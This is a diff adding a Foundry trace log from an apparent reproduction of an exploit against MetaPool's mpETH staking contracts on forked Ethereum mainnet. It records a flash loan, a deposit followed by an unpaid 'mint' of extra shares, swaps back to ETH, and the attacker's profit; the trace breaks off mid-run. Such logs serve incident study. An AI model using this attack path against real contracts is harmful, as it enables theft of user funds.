@@ -1,0 +1,257 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/MetaPool_exp.sol:MetaPool
+[PASS] testExploit() (gas: 26841125)
+Logs:
+  Attacker Before exploit ETH Balance: 0.000000000000000000
+  Attacker mpETH balance After exploit:  77787742211965048957
+  Attacker After exploit ETH Balance: 8.892400913564805164
+
+Traces:
+  [7934] MetaPool::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 22722910 [2.272e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [26939525] MetaPool::testExploit()
+    ├─ [0] VM::deal(MetaPool: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit ETH Balance", val: 0, decimals: 18)
+    ├─ [1155936] → new MetaPoolExploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Return] 5663 bytes of code
+    ├─ [25725442] MetaPoolExploit::start()
+    │   ├─ [25720433] Vault::flashLoan(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [200000000000000000000 [2e20]], 0x)
+    │   │   ├─ [2534] WETH9::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   │   └─ ← [Return] 28211956043150249554283 [2.821e22]
+    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [27962] WETH9::transfer(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 200000000000000000000 [2e20])
+    │   │   │   ├─ emit Transfer(from: Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 200000000000000000000 [2e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x00000000000000000000000000000000000000000000000ad78ebc5ac6200000
+    │   │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x0000000000000000000000000000000000000000000005f95f8a23e5597df16b → 0x0000000000000000000000000000000000000000000005ee87fb678a935df16b
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [25666624] MetaPoolExploit::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [200000000000000000000 [2e20]], [0], 0x)
+    │   │   │   ├─ [9195] WETH9::withdraw(107000000000000000000 [1.07e20])
+    │   │   │   │   ├─ [55] MetaPoolExploit::receive{value: 107000000000000000000}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Withdrawal(src: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], wad: 107000000000000000000 [1.07e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000ad78ebc5ac6200000 → 0x0000000000000000000000000000000000000000000000050aa25f43cf540000
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [131044] TransparentUpgradeableProxy::fallback{value: 107000000000000000000}(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   ├─ [123884] Staking::depositETH{value: 107000000000000000000}(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   ├─ [53148] TransparentUpgradeableProxy::fallback{value: 106910421811062161214}(TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710])
+    │   │   │   │   │   │   ├─ [45988] 0xcadD976AE3a04352B4Ab28865AF07AD2c366D675::swapETHFormpETH{value: 106910421811062161214}(TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [2526] TransparentUpgradeableProxy::fallback(106910421811062161214 [1.069e20]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1866] Staking::previewDeposit(106910421811062161214 [1.069e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 96938281985300295162 [9.693e19]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 96938281985300295162 [9.693e19]
+    │   │   │   │   │   │   │   ├─ [28479] TransparentUpgradeableProxy::fallback(TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710], 96938281985300295162 [9.693e19])
+    │   │   │   │   │   │   │   │   ├─ [27816] Staking::transfer(TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710], 96938281985300295162 [9.693e19]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], to: TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710], value: 96938281985300295162 [9.693e19])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x1c04a67001ce205e4a48851d6cb402dab0769f86bc3dbb862ae9adc1cf6a921f: 0x0000000000000000000000000000000000000000000000054149f5dd5678edfa → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xe240edc019ae974be08f1bff9c509e7dcd0d038aac3affee4f4a680b869ceb8a: 0 → 0x0000000000000000000000000000000000000000000000054149f5dd5678edfa
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 253: 0x000000000000000000000000000000000000000000000000031abbc404268dbf → 0x000000000000000000000000000000000000000000000005cec8d9f797af4cfd
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000054149f5dd5678edfa
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000054149f5dd5678edfa
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710], value: 81222724519175219 [8.122e16])
+    │   │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710], to: 0x52e5219EF6Af019776c0a64925370f92caB282EC, value: 0)
+    │   │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710], to: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 97019504709819470381 [9.701e19])
+    │   │   │   │   │   ├─ emit Deposit(sender: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], owner: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], assets: 107000000000000000000 [1.07e20], shares: 97019504709819470381 [9.701e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xe240edc019ae974be08f1bff9c509e7dcd0d038aac3affee4f4a680b869ceb8a: 0x0000000000000000000000000000000000000000000000054149f5dd5678edfa → 0
+    │   │   │   │   │   │   @ 53: 0x0000000000000000000000000000000000000000000000302293b93269bee3b8 → 0x00000000000000000000000000000000000000000000003023b448d5a46687eb
+    │   │   │   │   │   │   @ 255: 0x00000000000000000000000000000000000000000000003515fcf9f443e0f3c0 → 0x000000000000000000000000000000000000000000000035173b38d7a7243482
+    │   │   │   │   │   │   @ 0x2ecaf71f466ee5955d0b826a6054602f6f53dd5d8483d05745a7d277a0eaa919: 0 → 0x000000000000000000000000000000000000000000000005426a85809120922d
+    │   │   │   │   │   └─ ← [Return] 97019504709819470381 [9.701e19]
+    │   │   │   │   └─ ← [Return] 97019504709819470381 [9.701e19]
+    │   │   │   ├─ [34521] TransparentUpgradeableProxy::fallback(97019504709819470381 [9.701e19], MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   ├─ [33858] Staking::mint(97019504709819470381 [9.701e19], MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710], value: 97019504709819470381 [9.701e19])
+    │   │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710], to: 0x52e5219EF6Af019776c0a64925370f92caB282EC, value: 0)
+    │   │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710], to: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 97019504709819470381 [9.701e19])
+    │   │   │   │   │   ├─ emit Deposit(sender: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], owner: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], assets: 107000000000000000000 [1.07e20], shares: 97019504709819470381 [9.701e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 255: 0x000000000000000000000000000000000000000000000035173b38d7a7243482 → 0x00000000000000000000000000000000000000000000003ae42795ee9df03482
+    │   │   │   │   │   │   @ 0x2ecaf71f466ee5955d0b826a6054602f6f53dd5d8483d05745a7d277a0eaa919: 0x000000000000000000000000000000000000000000000005426a85809120922d → 0x00000000000000000000000000000000000000000000000a84d50b012241245a
+    │   │   │   │   │   │   @ 53: 0x00000000000000000000000000000000000000000000003023b448d5a46687eb → 0x000000000000000000000000000000000000000000000035661ece5635871a18
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000005ccec5d16f6cc0000
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000005ccec5d16f6cc0000
+    │   │   │   ├─ [25371] TransparentUpgradeableProxy::fallback(TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ [24708] Staking::approve(TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x718d36fc52a44309fca6ea17a36ac976c46ac11e25d3a69bcabc07728a8e81a0: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [44015] TransparentUpgradeableProxy::fallback(97000000000000000000 [9.7e19], 0)
+    │   │   │   │   ├─ [43352] 0xcadD976AE3a04352B4Ab28865AF07AD2c366D675::swapmpETHforETH(97000000000000000000 [9.7e19], 0) [delegatecall]
+    │   │   │   │   │   ├─ [2457] TransparentUpgradeableProxy::fallback(97000000000000000000 [9.7e19]) [staticcall]
+    │   │   │   │   │   │   ├─ [1797] Staking::convertToAssets(97000000000000000000 [9.7e19]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 106978488820810563234 [1.069e20]
+    │   │   │   │   │   │   └─ ← [Return] 106978488820810563234 [1.069e20]
+    │   │   │   │   │   ├─ [2457] TransparentUpgradeableProxy::fallback(87367900000000000000 [8.736e19]) [staticcall]
+    │   │   │   │   │   │   ├─ [1797] Staking::convertToAssets(87367900000000000000 [8.736e19]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 96355524880904074305 [9.635e19]
+    │   │   │   │   │   │   └─ ← [Return] 96355524880904074305 [9.635e19]
+    │   │   │   │   │   ├─ [4340] TransparentUpgradeableProxy::fallback(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], 97000000000000000000 [9.7e19])
+    │   │   │   │   │   │   ├─ [3671] Staking::transferFrom(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], 97000000000000000000 [9.7e19]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], value: 97000000000000000000 [9.7e19])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x2ecaf71f466ee5955d0b826a6054602f6f53dd5d8483d05745a7d277a0eaa919: 0x00000000000000000000000000000000000000000000000a84d50b012241245a → 0x00000000000000000000000000000000000000000000000542afd0eeb55d245a
+    │   │   │   │   │   │   │   │   @ 0x1c04a67001ce205e4a48851d6cb402dab0769f86bc3dbb862ae9adc1cf6a921f: 0 → 0x00000000000000000000000000000000000000000000000542253a126ce40000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [8579] TransparentUpgradeableProxy::fallback(0x8c89569355F321A91655CA520fC09Be5f6B0Ec4D, 2408025000000000000 [2.408e18])
+    │   │   │   │   │   │   ├─ [7916] Staking::transfer(0x8c89569355F321A91655CA520fC09Be5f6B0Ec4D, 2408025000000000000 [2.408e18]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], to: 0x8c89569355F321A91655CA520fC09Be5f6B0Ec4D, value: 2408025000000000000 [2.408e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1c04a67001ce205e4a48851d6cb402dab0769f86bc3dbb862ae9adc1cf6a921f: 0x00000000000000000000000000000000000000000000000542253a126ce40000 → 0x00000000000000000000000000000000000000000000000520ba3417bda17000
+    │   │   │   │   │   │   │   │   @ 0xb7088a6e3751011011c638ced5f9a9e74bfcf49d73ebd8a60ab63de56dd48489: 0x000000000000000000000000000000000000000000000000186391d229732059 → 0x00000000000000000000000000000000000000000000000039ce97ccd8b5b059
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [55] MetaPoolExploit::receive{value: 96355524880904074305}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Swap(param0: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 97000000000000000000 [9.7e19], param2: 96355524880904074305 [9.635e19], param3: 9632100000000000000 [9.632e18], param4: 2408025000000000000 [2.408e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 253: 0x000000000000000000000000000000000000000000000005cec8d9f797af4cfd → 0x00000000000000000000000000000000000000000000000095954299f71598bc
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000053933975da099b441
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000053933975da099b441
+    │   │   │   ├─ [33215] TransparentUpgradeableProxy::fallback(9600000000000000000 [9.6e18], 0)
+    │   │   │   │   ├─ [32552] 0xcadD976AE3a04352B4Ab28865AF07AD2c366D675::swapmpETHforETH(9600000000000000000 [9.6e18], 0) [delegatecall]
+    │   │   │   │   │   ├─ [2457] TransparentUpgradeableProxy::fallback(9600000000000000000 [9.6e18]) [staticcall]
+    │   │   │   │   │   │   ├─ [1797] Staking::convertToAssets(9600000000000000000 [9.6e18]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 10587561780203932031 [1.058e19]
+    │   │   │   │   │   │   └─ ← [Return] 10587561780203932031 [1.058e19]
+    │   │   │   │   │   ├─ [2457] TransparentUpgradeableProxy::fallback(8647680000000000000 [8.647e18]) [staticcall]
+    │   │   │   │   │   │   ├─ [1797] Staking::convertToAssets(8647680000000000000 [8.647e18]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 9537275651607701973 [9.537e18]
+    │   │   │   │   │   │   └─ ← [Return] 9537275651607701973 [9.537e18]
+    │   │   │   │   │   ├─ [4340] TransparentUpgradeableProxy::fallback(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], 9600000000000000000 [9.6e18])
+    │   │   │   │   │   │   ├─ [3671] Staking::transferFrom(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], 9600000000000000000 [9.6e18]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], value: 9600000000000000000 [9.6e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x2ecaf71f466ee5955d0b826a6054602f6f53dd5d8483d05745a7d277a0eaa919: 0x00000000000000000000000000000000000000000000000542afd0eeb55d245a → 0x000000000000000000000000000000000000000000000004bd75c3cba19d245a
+    │   │   │   │   │   │   │   │   @ 0x1c04a67001ce205e4a48851d6cb402dab0769f86bc3dbb862ae9adc1cf6a921f: 0x00000000000000000000000000000000000000000000000520ba3417bda17000 → 0x000000000000000000000000000000000000000000000005a5f4413ad1617000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [3779] TransparentUpgradeableProxy::fallback(0x8c89569355F321A91655CA520fC09Be5f6B0Ec4D, 238080000000000000 [2.38e17])
+    │   │   │   │   │   │   ├─ [3116] Staking::transfer(0x8c89569355F321A91655CA520fC09Be5f6B0Ec4D, 238080000000000000 [2.38e17]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc], to: 0x8c89569355F321A91655CA520fC09Be5f6B0Ec4D, value: 238080000000000000 [2.38e17])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xb7088a6e3751011011c638ced5f9a9e74bfcf49d73ebd8a60ab63de56dd48489: 0x00000000000000000000000000000000000000000000000039ce97ccd8b5b059 → 0x0000000000000000000000000000000000000000000000003d1c6c4c7cd5b059
+    │   │   │   │   │   │   │   │   @ 0x1c04a67001ce205e4a48851d6cb402dab0769f86bc3dbb862ae9adc1cf6a921f: 0x000000000000000000000000000000000000000000000005a5f4413ad1617000 → 0x000000000000000000000000000000000000000000000005a2a66cbb2d417000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [55] MetaPoolExploit::receive{value: 9537275651607701973}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Swap(param0: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 9600000000000000000 [9.6e18], param2: 9537275651607701973 [9.537e18], param3: 952320000000000000 [9.523e17], param4: 238080000000000000 [2.38e17])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 253: 0x00000000000000000000000000000000000000000000000095954299f71598bc → 0x000000000000000000000000000000000000000000000000113a0ced4c066ee7
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000845b35acab0f29d5
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000845b35acab0f29d5
+    │   │   │   ├─ [25371] TransparentUpgradeableProxy::fallback(SwapRouter02: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], 1000000000000000000000000000 [1e27])
+    │   │   │   │   ├─ [24708] Staking::approve(SwapRouter02: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], 1000000000000000000000000000 [1e27]) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: SwapRouter02: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], value: 1000000000000000000000000000 [1e27])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xbef464e9391f324fe3568cef5aa7f81ea370aa483feb203d62b7ec5f3f61a5e8: 0 → 0x0000000000000000000000000000000000000000033b2e3c9fd0803ce8000000
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [25281477] SwapRouter02::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 100, recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, amountIn: 10000000000000000000 [1e19], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   │   │   │   ├─ [25274081] 0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278::swap(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], true, 10000000000000000000 [1e19], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002b48afbbd342f64ef8a9ab1c143719b63c2ad81710000064c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [8062] WETH9::transfer(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 9999023359504975714 [9.999e18])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278, to: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 9999023359504975714 [9.999e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000000050aa25f43cf540000 → 0x00000000000000000000000000000000000000000000000595660a0883748762
+    │   │   │   │   │   │   │   @ 0xe62737f5802bd3ad0504733077654f1d4370e41b90697ee40b3db879ca4ecd12: 0x0000000000000000000000000000000000000000000000008ad458761323cb0a → 0x0000000000000000000000000000000000000000000000000010adb15f0343a8
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [3313] TransparentUpgradeableProxy::fallback(0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278) [staticcall]
+    │   │   │   │   │   │   ├─ [2653] Staking::balanceOf(0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 26556437132853761881 [2.655e19]
+    │   │   │   │   │   │   └─ ← [Return] 26556437132853761881 [2.655e19]
+    │   │   │   │   │   ├─ [13441] SwapRouter02::uniswapV3SwapCallback(9651267207673891805 [9.651e18], -9999023359504975714 [-9.999e18], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002b48afbbd342f64ef8a9ab1c143719b63c2ad81710000064c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
+    │   │   │   │   │   │   ├─ [9364] TransparentUpgradeableProxy::fallback(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278, 9651267207673891805 [9.651e18])
+    │   │   │   │   │   │   │   ├─ [8695] Staking::transferFrom(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278, 9651267207673891805 [9.651e18]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: SwapRouter02: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], value: 999999990348732792326108195 [9.999e26])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278, value: 9651267207673891805 [9.651e18])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xbef464e9391f324fe3568cef5aa7f81ea370aa483feb203d62b7ec5f3f61a5e8: 0x0000000000000000000000000000000000000000033b2e3c9fd0803ce8000000 → 0x0000000000000000000000000000000000000000033b2e3c19e04fd8de38b423
+    │   │   │   │   │   │   │   │   │   @ 0x54e166e1dc08f5d15d49a47272d01048b3771d6ab4824e3e3374115f07402e65: 0x000000000000000000000000000000000000000000000001708b6adecbbdd759 → 0x000000000000000000000000000000000000000000000001f67b9b42d5852336
+    │   │   │   │   │   │   │   │   │   @ 0x2ecaf71f466ee5955d0b826a6054602f6f53dd5d8483d05745a7d277a0eaa919: 0x000000000000000000000000000000000000000000000004bd75c3cba19d245a → 0x0000000000000000000000000000000000000000000000043785936797d5d87d
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [1313] TransparentUpgradeableProxy::fallback(0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278) [staticcall]
+    │   │   │   │   │   │   ├─ [653] Staking::balanceOf(0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 36207704340527653686 [3.62e19]
+    │   │   │   │   │   │   └─ ← [Return] 36207704340527653686 [3.62e19]
+    │   │   │   │   │   ├─ emit Swap(param0: SwapRouter02: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], param1: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 9651267207673891805 [9.651e18], param3: -9999023359504975714 [-9.999e18], param4: 4295128740 [4.295e9], param5: 0, param6: -887272 [-8.872e5])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x4ba79a39a06aaf88d26abfb96616b588fe37c013f6664cb20f480dddbe9133a8: 0x01653be45b00000eac0000000000000000000000000000000000000000142c80 → 0x0103153ccc000000000000000000006194dfc89f22e04fbe330000046974f378
+    │   │   │   │   │   │   @ 8: 0x0100000eac0000000000006194710998e0fb76f8400000046982ddf868511ca7 → 0x0100000eac0000000000006194dfc89f22e04fbe3300000469891ff868512127
+    │   │   │   │   │   │   @ 0x4ba79a39a06aaf88d26abfb96616b588fe37c013f6664cb20f480dddbe9133a7: 0 → 0x000000000000000000000000000000000001cfa6c0a5355448b5efa147438cdf
+    │   │   │   │   │   │   @ 0x4ba79a39a06aaf88d26abfb96616b588fe37c013f6664cb20f480dddbe9133a6: 0 → 0x0000000000000000000000000000000000000958443236162d658f5a03925686
+    │   │   │   │   │   │   @ 4: 0x000000000000000000000000000000000000000000000a66f434d961e67c152d → 0
+    │   │   │   │   │   │   @ 1: 0x0000000000000000000000000000000000000903e1db4168c64be4595ac9b2c3 → 0x0000000000000000000000000000000000000958443236162d658f5a03925686
+    │   │   │   │   │   │   @ 0: 0x0001000001000100000001640000000000000001049c4280db8ceb49830a6bf7 → 0x000100000100010000f2761800000000000000000000000000000001000276a4
+    │   │   │   │   │   └─ ← [Return] 9651267207673891805 [9.651e18], -9999023359504975714 [-9.999e18]
+    │   │   │   │   └─ ← [Return] 9999023359504975714 [9.999e18]
+    │   │   │   ├─ [2074] WETH9::deposit{value: 105893377554059829450}()
